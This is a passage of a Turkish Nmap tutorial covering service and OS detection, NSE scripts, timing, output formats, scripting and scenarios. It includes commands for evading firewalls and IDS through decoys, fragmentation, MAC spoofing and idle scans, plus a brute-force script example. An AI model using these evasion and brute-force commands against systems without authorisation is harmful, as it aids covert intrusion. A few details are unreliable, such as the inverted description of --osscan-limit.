    Starting Nmap 7.94 ( https://nmap.org ) at 2023-10-27 10:10 UTC
    Nmap scan report for 192.168.1.1
    Host is up (0.0020s latency).
    MAC Address: 00:1A:2B:3C:4D:5E (Router Vendor)
    Nmap scan report for 192.168.1.105
    Host is up (0.050s latency).
    MAC Address: AA:BB:CC:DD:EE:FF (PC Vendor)
    Nmap done: 256 IP addresses (2 hosts up) scanned in 3.45 seconds
    ```

#### Ping'i Atlamak (`-Pn` veya `-P0`)

Bazı hostlar veya güvenlik duvarları ICMP (ping) isteklerini engelleyebilir. Bu durumda Nmap, hostu "down" (kapalı) olarak işaretleyebilir ve port taraması yapmayabilir. `-Pn` seçeneği, Nmap'e host keşfi adımını atlamasını ve tüm belirtilen hedefleri canlı kabul ederek doğrudan port taramasına geçmesini söyler.

*   **Kullanım:** `nmap -Pn <hedef>`
*   **Ne Zaman Kullanılır?:** Hedefin kesinlikle canlı olduğunu bildiğinizde ancak ping'e yanıt vermediğinde (örn: firewall engelliyor).
*   **Dezavantajı:** Gerçekten kapalı olan hostları da taramaya çalışacağı için zaman kaybına neden olabilir.
```bash
nmap -Pn -sT -p 80,443 firewalled-server.com
```

### 3.3 Servis ve Versiyon Tespiti

Bir portun açık olduğunu bilmek iyi bir başlangıçtır, ancak o portta hangi servisin (örn: Apache, Nginx, OpenSSH) ve hangi versiyonunun çalıştığını bilmek, güvenlik analizi için çok daha değerlidir.

*   **Servis Versiyon Bilgisi (`-sV`):**
    Açık portlarda çalışan servislerin adını ve versiyonunu tespit etmeye çalışır. Bunun için çeşitli problar gönderir ve gelen yanıtlardaki banner'lara veya davranışlara bakarak bir imza veritabanıyla eşleştirir.
    *   **Kullanım:** `nmap -sV <hedef>`
    *   **Önemi:** Zafiyet araştırması için kritik bir adımdır. Belirli bir servis versiyonunun bilinen zafiyetleri olabilir.
    ```bash
    sudo nmap -sS -sV -p 21,22,80 scanme.nmap.org
    ```
    Örnek Çıktı:
    ```
    Starting Nmap 7.94 ( https://nmap.org ) at 2023-10-27 10:15 UTC
    Nmap scan report for scanme.nmap.org (45.33.32.156)
    Host is up (0.15s latency).
    PORT   STATE SERVICE VERSION
    21/tcp closed ftp
    22/tcp open  ssh     OpenSSH 6.6.1p1 Ubuntu 2ubuntu2 (Ubuntu Linux; protocol 2.0)
    80/tcp open  http    Apache httpd 2.4.7 ((Ubuntu))

    Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
    Nmap done: 1 IP address (1 host up) scanned in 8.72 seconds
    ```
    **Yorumlama:** 22. portta OpenSSH 6.6.1p1, 80. portta Apache 2.4.7 çalışıyor. "Service Info" kısmı ek bilgiler sunar.

*   **Versiyon Tespiti Yoğunluğu (`--version-intensity <0-9>`):**
    `-sV` için kullanılan probların ne kadar agresif olacağını belirler. Varsayılan 7'dir. Daha yüksek değerler daha fazla prob gönderir ve nadir servisleri tespit etme olasılığını artırır ancak tarama süresini uzatır. Düşük değerler daha hızlıdır.
    ```bash
    nmap -sV --version-intensity 9 <hedef> # En yoğun
    nmap -sV --version-intensity 0 <hedef> # En az yoğun, sadece temel banner yakalama
    ```

*   **RPC Taraması (`-sR`):**
    SunRPC (Remote Procedure Call) servislerini (NFS, NIS gibi) tarar. Genellikle `-sV` ile birlikte kullanılır çünkü `-sV` zaten RPC problarını içerir.
    ```bash
    sudo nmap -sR <hedef_linux_sunucusu>
    ```

### 3.4 İşletim Sistemi Tespiti

Nmap, hedef hostun işletim sistemini (örn: Windows 10, Linux Kernel 5.x, macOS Ventura) tahmin etmeye çalışabilir. Bunu TCP/IP yığınındaki çeşitli özelliklere (TCP pencere boyutu, IP ID sıralaması, ICMP yanıtları vb.) bakarak yapar.

*   **İşletim Sistemi Tahmini (`-O`):**
    *   **Kullanım:** `nmap -O <hedef>`
    *   **Gereksinim:** En az bir açık ve bir kapalı TCP portu gerektirir. Root/Administrator yetkisi önerilir.
    ```bash
    sudo nmap -O scanme.nmap.org
    ```
    Örnek Çıktı:
    ```
    ...
    Device type: general purpose
    Running: Linux 3.X|4.X
    OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4
    OS details: Linux 3.2 - 4.9
    Network Distance: 11 hops
    ...
    ```
    **Yorumlama:** Nmap, hedefi Linux 3.x veya 4.x çekirdeği çalıştıran genel amaçlı bir cihaz olarak tahmin ediyor. "Network Distance" ağdaki hop sayısını gösterir.

*   **OS Tahmin Sınırlamaları ve İpuçları:**
    *   Tahminler %100 doğru olmayabilir, özellikle alışılmadık veya değiştirilmiş TCP/IP yığınları varsa.
    *   Güvenlik duvarları veya NAT cihazları OS tespitini zorlaştırabilir.
    *   **`--osscan-limit`:** Eğer Nmap en az bir açık ve bir kapalı port bulamazsa OS taraması yapmaz. Bu seçenekle, bu koşul sağlanmasa bile OS taramasını zorlayabilirsiniz (sonuçlar daha az güvenilir olabilir).
        ```bash
        sudo nmap -O --osscan-limit <hedef>
        ```
    *   **`--osscan-guess` veya `--fuzzy`:** Nmap'in daha agresif tahminlerde bulunmasını sağlar. Daha fazla potansiyel eşleşme gösterir ancak yanlış pozitif olasılığı artar.
        ```bash
        sudo nmap -O --osscan-guess <hedef>
        ```
    *   Eğer `-sV` (versiyon tespiti) de kullanılıyorsa, servis banner'larından elde edilen OS bilgileri (örn: "Apache/2.4.7 (Ubuntu)") OS tespitinin doğruluğunu artırabilir.

### 3.5 Nmap Scripting Engine (NSE)

Nmap Scripting Engine (NSE), Nmap'in en güçlü özelliklerinden biridir. Kullanıcılara Lua programlama dilinde yazılmış scriptler aracılığıyla Nmap'in yeteneklerini genişletme imkanı sunar. NSE scriptleri şunlar için kullanılabilir:

*   Daha gelişmiş servis keşfi
*   Zafiyet tespiti
*   Arka kapı (backdoor) tespiti
*   Servislerle etkileşim (örn: banner grabbing, bilgi toplama)
*   Hatta bazı exploit denemeleri (dikkatli kullanılmalı!)

Nmap, yüzlerce hazır NSE scripti ile birlikte gelir.

#### Temel NSE Kullanımı

*   **Varsayılan Güvenli Scriptleri Çalıştırma (`-sC` veya `--script=default`):**
    En yaygın ve genellikle güvenli kabul edilen scriptleri çalıştırır. `-sV` ile birlikte kullanıldığında çok etkilidir.
    ```bash
    sudo nmap -sS -sC -sV <hedef>
    ```
*   **Belirli Bir Scripti veya Scriptleri Çalıştırma (`--script <script_adı_veya_dosyası>`):**
    Virgülle ayırarak birden fazla script belirtebilirsiniz.
    ```bash
    nmap --script=http-title,banner <hedef>
    nmap --script=./custom_script.nse <hedef> # Kendi yazdığınız script
    ```
*   **Script Kategorilerini Çalıştırma (`--script <kategori>`):**
    Scriptler kategorilere ayrılmıştır.
    *   `auth`: Kimlik doğrulama bilgilerini bulmaya veya kırmaya çalışır.
    *   `broadcast`: Ağdaki broadcast adreslerine sorgu göndererek bilgi toplar.
    *   `brute`: Servislere karşı kaba kuvvet (brute-force) saldırıları dener. **DİKKAT!**
    *   `default`: `-sC` ile çalışan, güvenli ve yaygın scriptler.
    *   `discovery`: Hedef hakkında daha fazla bilgi toplamaya çalışır (e-posta adresleri, SNMP bilgileri vb.).
    *   `dos`: Hizmet Reddi (DoS) zafiyetlerini test etmeye çalışır. **ÇOK DİKKAT!**
    *   `exploit`: Bilinen zafiyetleri sömürmeye çalışır. **ÇOK DİKKAT VE YASAL İZİN GEREKLİ!**
    *   `external`: Üçüncü parti veritabanlarına (örn: Whois) sorgu gönderir.
    *   `fuzzer`: Beklenmedik girdiler göndererek uygulamaları çökertmeye çalışır.
    *   `intrusive`: Hedef sistemde çökme veya sorun yaratma riski olan, güvenli olmayan scriptler.
    *   `malware`: Hedef sistemde malware olup olmadığını kontrol etmeye çalışır.
    *   `safe`: Hedef sistemi çökertme veya DoS riski düşük olan scriptler.
    *   `version`: Sadece `-sV` ile birlikte kullanılır, versiyon tespitini destekler.
    *   `vuln`: Bilinen güvenlik açıklarını kontrol eder (exploit etmeden). **En sık kullanılan kategorilerden biridir.**
    ```bash
    nmap --script=vuln <hedef> # Bilinen zafiyetleri tara
    nmap --script=discovery,safe <hedef>
    ```
*   **Tüm Scriptleri Çalıştırma (`--script=all`):**
    Nmap'in veritabanındaki tüm scriptleri çalıştırır. **Çok uzun sürebilir ve bazıları tehlikeli olabilir!**
*   **Scriptlere Argüman Verme (`--script-args <argüman_listesi>`):**
    Bazı scriptler çalışmak için argümanlara ihtiyaç duyar (örn: kullanıcı adı/şifre listesi, belirli bir yol).
    Argümanlar `anahtar=değer` şeklinde virgülle ayrılarak verilir.
    ```bash
    nmap --script=http-brute --script-args userdb=kullanicilar.txt,passdb=sifreler.txt <hedef>
    nmap --script=smb-enum-shares --script-args smbuser=guest,smbpass="" <hedef>
    ```
*   **Script Yardım Bilgisi (`--script-help <script_adı>`):**
    Belirli bir scriptin ne yaptığını ve hangi argümanları aldığını gösterir.
    ```bash
    nmap --script-help smb-os-discovery
    ```
*   **Script Veritabanını Güncelleme (`nmap --script-updatedb`):**
    Nmap'in script veritabanını günceller. Yeni scriptler eklenmiş veya mevcutlar güncellenmiş olabilir.

#### Popüler ve Kullanışlı NSE Script Örnekleri

*   **`http-title`:** Web sunucularının `<title>` etiketlerini çeker.
    ```bash
    nmap -p 80,443 --script=http-title <hedef_web_sunucusu_aralığı>
    ```
*   **`smb-os-discovery`:** SMB üzerinden Windows sistemlerin işletim sistemi, bilgisayar adı, domain/workgroup adı gibi bilgilerini toplamaya çalışır.
    ```bash
    sudo nmap -p 139,445 --script=smb-os-discovery <hedef_windows_aralığı>
    ```
*   **`ssh-hostkey`:** SSH sunucusunun host anahtarını (RSA, DSA, ECDSA, ED25519) gösterir.
    ```bash
    nmap -p 22 --script=ssh-hostkey <hedef_ssh_sunucusu>
    ```
*   **`dns-brute`:** Verilen bir domain için yaygın subdomain'leri (alt alan adları) bulmaya çalışır.
    ```bash
    nmap --script=dns-brute --script-args dns-brute.domain=example.com example.com
    ```
*   **`http-enum`:** Web sunucularında yaygın olarak bulunan dizinleri ve dosyaları (örn: /admin, /backup, robots.txt) tarar.
    ```bash
    nmap -p 80 --script=http-enum <hedef_web_sunucusu>
    ```
*   **`vulners` / `vulscan`:**
    *   `vulners`: Hedefteki servis versiyonlarını Vulners.com zafiyet veritabanıyla karşılaştırır. (`--script=vulners`)
    *   `vulscan`: Çeşitli offline zafiyet veritabanlarını (ExploitDB, CVE vb.) kullanarak tarama yapar. (Ayrı kurulum ve veritabanı indirme gerektirebilir: [https://github.com/scipag/vulscan](https://github.com/scipag/vulscan))
    ```bash
    sudo nmap -sV --script=vulners <hedef>
    ```
*   **`ssl-enum-ciphers`:** Bir SSL/TLS servisinin desteklediği şifreleme paketlerini, protokol versiyonlarını ve anahtar değişim bilgilerini listeler. Zayıf SSL yapılandırmalarını tespit etmek için kullanışlıdır.
    ```bash
    nmap -p 443 --script=ssl-enum-ciphers <hedef_ssl_servisi>
    ```
*   **`ftp-anon`:** FTP sunucusunda anonim (anonymous) girişin mümkün olup olmadığını kontrol eder.
    ```bash
    nmap -p 21 --script=ftp-anon <hedef_ftp_sunucusu>
    ```

**NSE Scriptlerini Keşfetmek:** Nmap'in scriptleri genellikle `/usr/share/nmap/scripts/` (Linux) veya Nmap kurulum dizinindeki `scripts` klasöründe bulunur. Bu dizini inceleyerek veya Nmap'in resmi dokümantasyonuna bakarak daha fazla script keşfedebilirsiniz.

### 3.6 Zamanlama ve Performans

Nmap taramaları, özellikle büyük ağlarda veya çok sayıda port tarandığında uzun sürebilir. Nmap, tarama hızını ve agresifliğini ayarlamak için çeşitli seçenekler sunar.

*   **Zamanlama Şablonları (`-T<0-5>`):**
    Nmap, tarama hızını ve kaynak kullanımını etkileyen önceden tanımlanmış 6 zamanlama şablonu sunar:
    *   `-T0` (`paranoid`): Çok yavaş, IDS'lerden kaçınmak için tasarlanmıştır. Paketler arasında uzun gecikmeler vardır.
    *   `-T1` (`sneaky`): `-T0`'a benzer şekilde yavaş ve gizlidir.
    *   `-T2` (`polite`): Daha yavaş tarar, daha az bant genişliği kullanır ve hedef sistemlere daha az yük bindirir.
    *   `-T3` (`normal`): Varsayılan zamanlama şablonudur. Hız ve kaynak kullanımı arasında iyi bir denge kurar.
    *   `-T4` (`aggressive`): Daha hızlı tarar. Hedeflerin hızlı ve güvenilir bir ağ üzerinde olduğunu varsayar. Tarama süresini önemli ölçüde kısaltabilir.
    *   `-T5` (`insane`): Aşırı derecede hızlı tarar. Sadece çok hızlı ağlarda ve hedef sistemlerin bu hıza dayanabileceğinden emin olunduğunda kullanılmalıdır. Paket kaybı veya yanlış sonuçlar olabilir.

    ```bash
    nmap -T4 scanme.nmap.org  # Agresif tarama
    nmap -T2 internal-network.lan # Daha nazik tarama
    ```
    **Not:** `-T0` ve `-T1` çok yavaş olduğu için genellikle pratik değildir. `-T5` ise dikkatli kullanılmalıdır. Çoğu durumda `-T3` veya `-T4` iyi bir seçimdir.

*   **Paket Hızı Kontrolü:**
    *   `--min-rate <saniyede_paket>`: Saniyede gönderilecek minimum paket sayısını belirler.
    *   `--max-rate <saniyede_paket>`: Saniyede gönderilecek maksimum paket sayısını belirler.
    ```bash
    nmap --min-rate 100 --max-rate 500 <hedef>
    ```

*   **Paralel İşlemler:**
    *   `--min-parallelism <sayı>`: Aynı anda yapılacak minimum prob sayısını belirler.
    *   `--max-parallelism <sayı>`: Aynı anda yapılacak maksimum prob sayısını belirler.
    *   `--min-hostgroup <boyut>`, `--max-hostgroup <boyut>`: Aynı anda taranacak host gruplarının boyutunu ayarlar.

*   **Zaman Aşımları (Timeouts):**
    *   `--host-timeout <süre>`: Bir hostun taranması için maksimum süreyi belirler (örn: `30m` - 30 dakika, `2h` - 2 saat). Bu süreyi aşan hostlar atlanır.
    *   `--scan-delay <süre>`, `--max-scan-delay <süre>`: Gönderilen problar arasındaki gecikmeyi ayarlar. `-T0` gibi şablonlarda kullanılır.
    *   `--rtt-timeout <süre>`, `--initial-rtt-timeout <süre>`, `--max-rtt-timeout <süre>`: Round-Trip Time (RTT) ile ilgili zaman aşımlarını ayarlar. Nmap, ağ koşullarına göre bu değerleri dinamik olarak ayarlar.

**İpucu:** Performansı optimize etmek için, ağınızın ve hedef sistemlerinizin kapasitesini göz önünde bulundurun. Yerel ağda `-T4` veya `-T5` kullanılabilirken, internet üzerinden yapılan taramalarda veya hassas sistemlere karşı `-T3` veya daha düşük bir şablon daha uygun olabilir.

### 3.7 Firewall/IDS Atlatma ve Gizlenme

Güvenlik duvarları (Firewalls) ve Saldırı Tespit/Önleme Sistemleri (IDS/IPS), ağ taramalarını tespit etmek ve engellemek için tasarlanmıştır. Nmap, bu tür savunmaları atlatmaya veya en azından tespit edilme olasılığını azaltmaya yardımcı olabilecek çeşitli teknikler sunar. **Bu tekniklerin etkinliği, hedefteki güvenlik sistemlerinin yapılandırmasına ve karmaşıklığına bağlıdır ve %100 başarı garantisi yoktur.**

*   **Paket Parçalama (`-f`, `--mtu`):**
    *   `-f`: IP paketlerini daha küçük parçalara (fragment) böler. Bazı eski veya basit paket filtreleri, tüm parçaları birleştiremeyebilir ve taramayı gözden kaçırabilir.
    *   `--mtu <değer>`: Belirli bir Maksimum İletim Birimi (MTU) boyutu belirterek paketleri parçalar. Değer 8'in katı olmalıdır (örn: `--mtu 8`, `--mtu 16`).
    ```bash
    sudo nmap -sS -f <hedef>
    sudo nmap -sS --mtu 16 <hedef>
    ```
    **Not:** Modern IDS/IPS'ler genellikle parçalanmış paketleri yeniden birleştirebilir.

*   **Sahte Kaynak IP (Decoys) (`-D`):**
    Taramayı yaparken, hedef sisteme kendi gerçek IP adresinizin yanı sıra sahte (decoy) IP adreslerinden de paketler gönderir. Bu, gerçek tarayıcının kimliğini gizlemeye yardımcı olabilir.
    *   `ME`: Kendi gerçek IP adresinizi decoy listesine ekler.
    *   `RND` veya `RND:<sayı>`: Rastgele veya belirtilen sayıda rastgele, geçerli olmayan IP adresi üretir.
    *   Belirli IP'ler: Virgülle ayırarak sahte IP'ler ekleyebilirsiniz.
    ```bash
    sudo nmap -sS -D RND:5,ME,10.0.0.1,10.0.0.2 <hedef>
    ```
    **UYARI:** Bu teknik, hedef sistemin loglarında çok fazla "gürültü" yaratır ve eğer sahte IP'ler gerçek ve masum sistemlere aitse, o sistemlerin sahiplerini yanlışlıkla alarma geçirebilir. Çok dikkatli kullanılmalıdır.

*   **Kaynak Port Belirleme (`--source-port <portnum>` veya `-g <portnum>`):**
    Nmap'in giden paketleri için belirli bir kaynak portu kullanmasını sağlar. Bazı güvenlik duvarları, bilinen kaynak portlarından (örn: 53-DNS, 80-HTTP) gelen trafiğe izin verecek şekilde yapılandırılmış olabilir.
    ```bash
    sudo nmap -sS --source-port 53 <hedef>
    ```

*   **MAC Adresi Sahteciliği (`--spoof-mac <MAC_adresi|0|vendor_adı>`):**
    Eğer tarama yerel Ethernet ağı üzerinden yapılıyorsa, Nmap'in gönderdiği paketlerdeki kaynak MAC adresini sahteler.
    *   Belirli bir MAC adresi (örn: `00:11:22:33:44:55`)
    *   `0`: Tamamen rastgele bir MAC adresi oluşturur.
    *   `Vendor Adı` (örn: `Apple`, `Dell`, `Cisco`): Belirtilen üreticiye ait rastgele bir MAC adresi oluşturur.
    ```bash
    sudo nmap -sn --spoof-mac 0 192.168.1.0/24 # Yerel ağdaki hostları rastgele MAC ile keşfet
    ```
    **Not:** Bu sadece yerel ağda (aynı broadcast domaini içinde) etkilidir.

*   **Veri Uzunluğu Değiştirme (`--data-length <sayı>`):**
    Gönderilen problara rastgele baytlar ekleyerek paket boyutunu artırır. Bazı filtreler belirli paket boyutlarına duyarlı olabilir.
    ```bash
    sudo nmap -sS --data-length 25 <hedef>
    ```

*   **Idle Scan (`-sI <zombie_host[:prob_port]>`):**
    En gizli tarama tekniklerinden biridir. Hedef sisteme doğrudan paket göndermek yerine, ağdaki "idle" (boşta, trafiği az) bir "zombi" hostu kullanarak dolaylı bir tarama yapar. Zombi hostun IP ID sıralamasındaki değişiklikleri analiz ederek hedef portun durumunu anlamaya çalışır.
    *   **Gereksinimler:** Root yetkisi, güvenilir bir zombi host (IP ID sıralaması tahmin edilebilir ve artan olmalı, trafiği az olmalı).
    *   **Çalışma Mantığı:**
        1. Nmap zombinin IP ID'sini alır.
        2. Nmap, zombinin IP adresini kaynak olarak göstererek hedefin bir portuna SYN paketi gönderir.
        3. Eğer hedef port açıksa, hedeften zombiye bir SYN/ACK gider. Zombi bu beklenmedik SYN/ACK'e RST ile yanıt verirken kendi IP ID'sini bir artırır.
        4. Eğer hedef port kapalıysa, hedeften zombiye bir RST gider. Zombi buna yanıt vermez, IP ID'si değişmez.
        5. Eğer hedef port filtrelenmişse, hedeften zombiye hiçbir şey gitmez, IP ID'si değişmez.
        6. Nmap tekrar zombinin IP ID'sini kontrol eder. İlk IP ID'den 2 fazla ise hedef port açık, 1 fazla ise kapalı veya filtrelenmiş demektir.
    ```bash
    sudo nmap -Pn -sI zombie.example.com target.example.com
    ```
    **Not:** İyi bir zombi host bulmak zor olabilir. `ipidseq` NSE scripti (`nmap --script ipidseq <potansiyel_zombi>`) zombi adaylarını test etmek için kullanılabilir.

*   **Farklı Ping Türleri Kullanma:**
    Host keşfi aşamasında varsayılan ping türleri (ICMP echo, TCP SYN/ACK) engelleniyorsa, alternatif ping türleri denenebilir:
    *   `-PE`: ICMP Echo Request (varsayılanlardan biri)
    *   `-PP`: ICMP Timestamp Request
    *   `-PM`: ICMP Address Mask Request
    *   `-PS<portlist>`: TCP SYN Ping (belirtilen portlara, varsayılan 80)
    *   `-PA<portlist>`: TCP ACK Ping (belirtilen portlara, varsayılan 80)
    *   `-PU<portlist>`: UDP Ping (belirtilen portlara, varsayılan 40125)
    *   `-PR`: ARP Ping (sadece yerel ağda)
    ```bash
    sudo nmap -sn -PA22,80,443 192.168.1.0/24 # Yerel ağı 22,80,443 portlarına ACK ping ile tara
    ```

*   **TCP Window Scan (`-sW`):**
    Bazı işletim sistemlerinin TCP pencere boyutlarındaki farklılıklardan yararlanarak açık, kapalı veya filtrelenmiş portları ayırt etmeye çalışır. `-sA` (ACK scan) gibi genellikle filtrelenmiş/filtrelenmemiş ayrımı yapar.

*   **FIN, NULL, Xmas Taramaları (`-sF`, `-sN`, `-sX`):**
    Bu taramalar, RFC 793'e aykırı davranan (stateless firewall'lar veya bazı işletim sistemleri) sistemleri tespit etmek için kullanılabilir.
    *   FIN Scan (`-sF`): Sadece FIN bayrağı ayarlı bir paket gönderir. Kapalı port RST ile yanıt vermeli, açık port yanıt vermemeli.
    *   NULL Scan (`-sN`): Hiçbir bayrak ayarlı olmayan bir paket gönderir.
    *   Xmas Scan (`-sX`): FIN, PSH ve URG bayrakları ayarlı bir paket gönderir.
    **Not:** Microsoft Windows ve birçok modern sistem RFC'ye uygun davrandığı için bu taramalarda tüm portları `closed` veya `filtered` olarak gösterebilir. Daha çok UNIX benzeri sistemlerde işe yarayabilir.

**Unutmayın:** Bu tekniklerin hiçbiri sihirli bir değnek değildir. En iyi yaklaşım, hedef ortamı anlamak ve duruma uygun teknikleri birleştirmektir. Ayrıca, agresif atlatma teknikleri hedef sistemlerde istenmeyen alarmlara veya sorunlara yol açabilir.

### 3.8 Çıktı Formatları ve Yönetimi

Nmap tarama sonuçlarını çeşitli formatlarda kaydetmenizi sağlar. Bu, raporlama, otomasyon ve diğer araçlarla entegrasyon için önemlidir.

*   **Normal Çıktı (`-oN <dosyaadı>`):**
    Nmap'in ekranda gördüğünüz standart çıktısını bir dosyaya kaydeder. İnsan tarafından okunabilir.
    ```bash
    nmap -sS -A scanme.nmap.org -oN scan_results.txt
    ```

*   **XML Çıktı (`-oX <dosyaadı>`):**
    Tarama sonuçlarını yapılandırılmış bir XML formatında kaydeder. Bu, Nmap sonuçlarını programatik olarak işlemek, Ndiff ile karşılaştırmak veya diğer araçlara (örn: Metasploit, MagicTree) aktarmak için en kullanışlı formattır.
    ```bash
    nmap -sS -A scanme.nmap.org -oX scan_results.xml
    ```

*   **Grep'lenebilir Çıktı (`-oG <dosyaadı>`):**
    Sonuçları, `grep`, `awk`, `cut` gibi komut satırı araçlarıyla kolayca işlenebilecek basit bir formatta kaydeder. Her host için tek bir satır içerir.
    ```bash
    nmap -sS -A scanme.nmap.org -oG scan_results.gnmap
    ```
    Bu format artık XML kadar popüler olmasa da hızlı scriptler için hala kullanılabilir.

*   **Tüm Ana Formatlarda Çıktı (`-oA <dosya_öneki>`):**
    Yukarıdaki üç formatta da (normal, XML, grep'lenebilir) çıktı oluşturur. Dosya adları `<dosya_öneki>.nmap`, `<dosya_öneki>.xml` ve `<dosya_öneki>.gnmap` şeklinde olur.
    ```bash
    nmap -sS -A scanme.nmap.org -oA scan_report_basename
    ```

*   **Ayrıntı Seviyesi (Verbosity):**
    *   `-v`: Ayrıntı seviyesini artırır. Tarama sırasında daha fazla bilgi gösterir.
    *   `-vv`: Daha da fazla ayrıntı gösterir.
    *   `-d`: Hata ayıklama (debug) çıktısını etkinleştirir. Ne olup bittiğini anlamak için çok detaylı bilgi verir.
    *   `-dd`: Daha da fazla hata ayıklama çıktısı.
    ```bash
    nmap -vv -A scanme.nmap.org
    ```

*   **Sadece Açık Portları Gösterme (`--open`):**
    Çıktıda sadece `open` (ve bazen `open|filtered`) durumundaki portları listeler. Büyük taramalarda çıktıyı sadeleştirmek için kullanışlıdır.
    ```bash
    nmap --open scanme.nmap.org
    ```

*   **Neden Portlar Kapalı/Filtreli (`--reason`):**
    Nmap'in bir portun durumunu (örn: `closed`, `filtered`) neden o şekilde belirlediğini gösterir (örn: `conn-refused`, `no-response`).
    ```bash
    nmap --reason scanme.nmap.org
    ```

*   **Devam Eden Taramayı Sürdürme (`--resume <dosyaadı.nmap_veya_gnmap>`):**
    Eğer bir tarama yarıda kesildiyse (Ctrl+C ile veya sistem kapanmasıyla), normal (`.nmap`) veya grep'lenebilir (`.gnmap`) çıktı dosyalarını kullanarak taramayı kaldığı yerden devam ettirebilirsiniz. XML çıktıları (`.xml`) devam ettirme için kullanılamaz.
    ```bash
    # Tarama yarıda kesildi, scan.nmap dosyası oluştu
    nmap --resume scan.nmap
    ```

### 3.9 İleri Seviye Nmap Uygulamaları

#### Lua ile Basit NSE Script Yazımına Giriş

Nmap Scripting Engine (NSE), Lua programlama dilini kullanır. Kendi özel tarama ihtiyaçlarınız için basit scriptler yazabilirsiniz.

**Örnek: Basit bir "Merhaba Dünya" NSE Scripti (`merhaba.nse`)**
```lua
-- Script Açıklaması
description = [[
Basit bir merhaba dünya NSE scripti.
Belirtilen host ve port için "Merhaba Dünya" mesajını yazdırır.
]]

-- Script Kategorisi
categories = {"safe", "discovery"}

-- Script Yazarı ve Lisansı
author = "Adınız"
license = "Same as Nmap -- See https://nmap.org/book/man-legal.html"

-- Hangi tür portlarda çalışacağı (TCP veya UDP)
portrule = function(host, port)
  return port.protocol == "tcp" and port.state == "open"
end

-- Ana script fonksiyonu
action = function(host, port)
  local output_tbl = {}
  table.insert(output_tbl, string.format("Merhaba Dünya, %s:%d portundan!", host.ip, port.number))
  return stdnse.format_output(true, output_tbl)
end
```
**Kullanımı:**
1.  Yukarıdaki kodu `merhaba.nse` adıyla bir dosyaya kaydedin.
2.  Nmap ile çalıştırın:
    ```bash
    nmap -p 80 --script=./merhaba.nse scanme.nmap.org
    ```
    Çıktıda şuna benzer bir satır görmelisiniz:
    ```
    PORT   STATE SERVICE
    80/tcp open  http
    | merhaba:
    |_  Merhaba Dünya, 45.33.32.156:80 portundan!
    ```

Bu çok temel bir örnektir. NSE, ağ işlemleri yapmak, soketlerle çalışmak, string manipülasyonu ve daha fazlası için kapsamlı bir kütüphane (`stdnse`, `shortport`, `http` vb.) sunar. Daha karmaşık scriptler için Nmap'in resmi dokümantasyonunu ve mevcut scriptlerin kaynak kodlarını inceleyebilirsiniz.

#### Python ile Nmap Entegrasyonu (`python-nmap` kütüphanesi)

Python'dan Nmap taramalarını programatik olarak başlatmak ve sonuçlarını işlemek için `python-nmap` gibi kütüphaneler kullanabilirsiniz.

1.  **Kurulum:**
    ```bash
    pip install python-nmap
    ```
2.  **Örnek Python Scripti:**
    ```python
    import nmap

    def scan_host(host, ports='22,80,443', arguments='-sS -sV'):
        nm = nmap.PortScanner()
        print(f"Scanning {host} on ports {ports} with arguments '{arguments}'...")
        try:
            nm.scan(hosts=host, ports=ports, arguments=arguments)
        except nmap.PortScannerError as e:
            print(f"Scan error: {e}")
            return None

        for host_ip in nm.all_hosts():
            print(f"----------------------------------------------------")
            print(f"Host : {host_ip} ({nm[host_ip].hostname()})")
            print(f"State : {nm[host_ip].state()}")

            for proto in nm[host_ip].all_protocols():
                print(f"----------")
                print(f"Protocol : {proto}")

                lport = nm[host_ip][proto].keys()
                # sorted_ports = sorted(lport) # Portları sıralamak isterseniz
                for port in lport:
                    port_info = nm[host_ip][proto][port]
                    print(f"port : {port}\tstate : {port_info['state']}\tname : {port_info['name']}\tversion : {port_info.get('version', 'N/A')}")
        return nm

    if __name__ == '__main__':
        target_host = "scanme.nmap.org"
        # target_host = "192.168.1.1" # Lokal bir hedef için
        scan_results = scan_host(target_host)

        # Sonuçları daha detaylı işleyebilirsiniz
        # if scan_results:
        #     print("\nRaw XML output:")
        #     print(scan_results.csv()) # Veya XML: scan_results.scanstats()
    ```
Bu script, belirtilen hostu ve portları tarar, sonuçları ekrana yazdırır. Sonuçlar Python dictionary'leri olarak erişilebilir olduğu için kolayca işlenebilir.

### 3.10 Nmap Örnek Senaryoları

Aşağıda, Nmap'in farklı durumlarda nasıl kullanılabileceğine dair pratik senaryolar bulunmaktadır.

#### Senaryo 1: Lokal Ağdaki Aktif Cihazları ve Açık Portları Bulmak

**Amaç:** Kendi lokal ağınızdaki (örn: ev veya küçük ofis ağı) tüm aktif cihazları keşfetmek ve bu cihazlarda en yaygın açık portları bulmak.
**Komut:**
```bash
sudo nmap -sn 192.168.1.0/24 -oN aktif_cihazlar.txt # Sadece aktif cihazları bul ve dosyaya yaz
sudo nmap -F -T4 -iL aktif_cihazlar.txt -oA lokal_ag_hizli_tarama # Aktif cihazlarda en popüler 100 portu tara
```
**Adımlar ve Açıklamalar:**
1.  `sudo nmap -sn 192.168.1.0/24 -oN aktif_cihazlar.txt`:
    *   `-sn`: Ping taraması yapar, port taraması yapmaz. Sadece canlı hostları tespit eder.
    *   `192.168.1.0/24`: Kendi lokal ağ adres aralığınızla değiştirin (örn: `192.168.0.0/24`, `10.0.0.0/24`).
    *   `-oN aktif_cihazlar.txt`: Çıktıyı `aktif_cihazlar.txt` dosyasına kaydeder. Bu dosyada canlı bulunan IP adresleri listelenecektir.
2.  `sudo nmap -F -T4 -iL aktif_cihazlar.txt -oA lokal_ag_hizli_tarama`:
    *   `-F`: Hızlı tarama yapar (en popüler 100 port).
    *   `-T4`: Agresif zamanlama şablonu kullanır (lokal ağda genellikle güvenlidir).
    *   `-iL aktif_cihazlar.txt`: Bir önceki adımda oluşturulan dosyadan hedef IP listesini okur.
    *   `-oA lokal_ag_hizli_tarama`: Sonuçları `lokal_ag_hizli_tarama.nmap`, `.xml`, `.gnmap` dosyalarına kaydeder.

**Analiz:** `lokal_ag_hizli_tarama.nmap` veya `.xml` dosyasını inceleyerek hangi cihazların hangi portları açık tuttuğunu görebilirsiniz. Bu, ağınızdaki yazıcıları, NAS cihazlarını, diğer bilgisayarları vb. tanımlamanıza yardımcı olabilir.

#### Senaryo 2: Bir Web Sunucusunun Detaylı Güvenlik Analizi

**Amaç:** Belirli bir web sunucusunun güvenlik duruşunu detaylı bir şekilde analiz etmek (açık portlar, servis versiyonları, HTTP başlıkları, SSL/TLS yapılandırması, bilinen zafiyetler).
**Komut:**
```bash
